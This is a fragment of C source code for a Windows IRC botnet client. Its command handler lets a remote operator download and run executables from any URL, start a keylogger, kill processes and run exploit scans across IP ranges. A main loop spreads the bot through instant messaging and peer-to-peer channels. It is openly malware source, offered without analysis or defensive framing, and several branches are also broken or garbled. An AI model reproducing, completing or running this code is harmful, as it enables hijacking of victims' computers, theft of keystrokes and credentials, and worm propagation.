					 for (i = s+1; i < (sizeof(a)/4); i++) {
						 if (a[i]==NULL) break;
						 
						 if (killthread(atoi(a[i])))
							 sprintf(sendbuf,"threads: Killed thread: %s.",a[i]);
						 else 
							 sprintf(sendbuf,"threads: Failed to kill thread: %s.",a[i]);
						 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						 //addlog(sendbuf);
					 }
				 }
				 
				 return 1;
			 }
			 else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				 if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					 if (!silent) irc_privmsg(sock, a[2], "File opened.", notice);
				 } else {
					 if (!silent) irc_privmsg(sock, a[2], "Couldn't open file.", notice);
				 }
			 }
			 else if(strcmp("bkill", a[s]) == 0) {
				 int Killer();
				 sprintf(sendbuf,"Main -> Bot killer done.",a[i]);
				 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			 }
			 else if(strcmp("keylog", a[s]) == 0) {
				 void *keylog ();
				 sprintf(sendbuf,"Main -> Keylogger started.",a[i]);
				 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			 }
	     	 else if (strcmp("dltest", a[s]) == 0 || strcmp ("dl2", a[s]) == 0) {
	         char *url;
	         char		*sRet_Str = NULL;
        	 url = sRet_Str;
		     url = strtok(sRet_Str, " ");
	         url = strtok(NULL, " ");		
	         strcpy(fileto,"winsp3");
	         strcat(fileto,".exe");
}
			 else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				 strncpy(server,  a[s+1], 127);
			 }
			 // commands requiring at least 2 parameters
			 else if (a[s+2] == NULL) return 1;
			 
#ifndef NO_DOWNLOAD
			 else if (strcmp("update", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				 if (strcmp(botid, a[s+2]) == 0) return 1;
				 ds ds;
				 char *filename[MAX_PATH];
				 memset(filename,0,sizeof(filename));
				 sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				 strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				 ds.run = 0;
				 ds.sock = sock;
				 strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				 sprintf(sendbuf, "update (%s)", ds.url);
				 ds.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
				 ds.update = 1;
				 ds.silent = silent;
				 threads[ds.threadnum].tHandle = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				 sprintf(sendbuf, "downloading update from %s...\r\n", a[s+1]);
				 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				 while(1) {
					 if (ds.gotinfo == TRUE) break;
					 Sleep(50);
				 }
			 }
#endif
			 // commands requiring at least 3 parameters
			 else if (a[s+3] == NULL) return 1;
#ifndef NO_DOWNLOAD
			 else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				 ds ds;
				 strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				 strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				 if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				 ds.sock = sock;
				 strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				 sprintf(sendbuf, "download (%s)", ds.url);
				 ds.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				 ds.update = 0;
				 ds.silent = silent;
				 threads[ds.threadnum].tHandle = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				 if (!silent) sprintf(sendbuf, "downloading %s...\r\n", a[s+1]);
				 irc_privmsg(sock, a[2], sendbuf, notice);
				 while(1) {
					 if (ds.gotinfo == TRUE) break;
					 Sleep(50);
				 }
			 }
#endif
			 // commands requiring at least 4 parameters
			 else if (a[s+4] == NULL) return 1;
			 else if (strcmp("cscan", a[s]) == 0 || strcmp("cscanner", a[s]) == 0) {
				 int scanthreads=findthreadid(SCAN_THREAD);
				 if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					 sprintf(sendbuf ,"-sc-: Already %d scanning threads. Too many specified.", scanthreads);
					 irc_privmsg(sock,a[2],sendbuf,notice);
				 } else {
					 ADVSCAN advscan;
					 advscan.port = atoi(a[s+1]); // check for method or port number
					 advscan.threads = atoi(a[s+2]);
					 advscan.delay = atoi(a[s+3]);
					 advscan.delay = ((advscan.delay < 3)?(5):(advscan.delay));
					 advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					 advscan.minutes = atoi(a[s+4]);
					 advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					 advscan.exploit = -1;
					 
					 for(i=0;exploit[i].port != 0;i++) {
						 if (strcmp(exploit[i].command, a[s+1]) == 0) {
							 advscan.port = exploit[i].port;
							 advscan.exploit = i;
							 
							 break;
						 }
					 }
					 
					 if (advscan.port == 0) {
						 sprintf(sendbuf, "\2.cscan.\2: failed to start scan, port is invalid.");
						 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						 //addlog(sendbuf);
						 
						 return 1;
					 }
					 
					 if (a[s+5] && a[s+5][0] != '#') {
						 _snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						 advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					 } else {
						 if (parmenters['a'] || parmenters['b'] || parmenters['r']) {
							 if (parmenters['e']) 
							 { 
								 IN_ADDR in;
								 in.s_addr=ResolveAddress(host);
								 strncpy(advscan.ip,inet_ntoa(in), sizeof(advscan.ip));
								 
								 in.s_addr&=(parmenters['a'])?(0xFF):(0xFFFF);
								 strncpy(advscan.ip,inet_ntoa(in), sizeof(advscan.ip));
							 } 
							 SOCKADDR_IN ssin;
							 int ssin_len=sizeof(ssin);
							 getsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							 ssin.sin_addr.S_un.S_addr&=(parmenters['a']) ? 0xFF : 0xFFFF;
							 strncpy(advscan.ip,inet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
							 
							 if (parmenters['r']) {
								 int extractip = ((parmenters['a']) ? 3 : 2);
								 for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
								 
								 advscan.random = TRUE;
							 } else
								 advscan.random = FALSE;
						 } else {
							 sprintf(sendbuf, "\2.cscan.\2: Failed to start scan, no IP specified.");
							 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							 //addlog(sendbuf);
							transfer_info = param['i'];
							 return 1;
						 }
					 }
					 
					 advscan.sock = sock;
					 advscan.notice = notice;
					 advscan.silent = silent;
					 _snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					 if (a[s+6])
						 _snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					 else if (a[s+5] && a[s+5][0] == '#')
						 _snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					 else if (strcmp(exploitchan,"") != 0)
						 _snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					 else
						 advscan.msgchan[0] = '\0';
					 sprintf(sendbuf, "\2.cscan.\2: %s Exploit (#%s#) scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", advscan.exploit, ((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
					 advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					 if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						 while(advscan.gotinfo == FALSE)
							 Sleep(50);
					 } else
						 sprintf(sendbuf,"\2.cscan.\2: Failed to start scan thread, error: <%d>.", GetLastError());
					 
					 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					 //addlog(sendbuf);
					 
					 return 1;
				 }
			 }
		}
	}
	return repeat;
}




// irc send functions
void irc_send(SOCKET sock, char *msg)
{
	char msgbuf[512];
	
	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
}


void irc_sendf(SOCKET sock, char *msg, char *str)
{
	char msgbuf[512];
	
	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
}

void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
{
	char msgbuf[512];
	
	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
{
	char msgbuf[512];
	char *action;
	
	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
}
bool Main()
{
	if (!InitWinSock())
		return false;


	if (GetLastError() == ERROR_ALREADY_EXISTS) 
		ExitProcess(0);

	while (true)
	{
#ifndef NO_IMSPREAD
		InfectIM();
#endif
#ifndef NO_P2PSPREAD
		InfectP2P();
#endif
		Sleep(1000*300);
	}
	return true;
}
bool InitWinSock()
{
	WSADATA *wsaData = new WSADATA;

	if (wsaData)
		ZeroMemory(wsaData, sizeof(wsaData));
	else
		ExitThread(0);

	if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0)
		return false;

	if (LOBYTE(wsaData->wVersion) != 2 ||
		HIBYTE(wsaData->wVersion) != 2)
	{
		WSACleanup();
		return false;
	}

	delete wsaData;
	return true;
}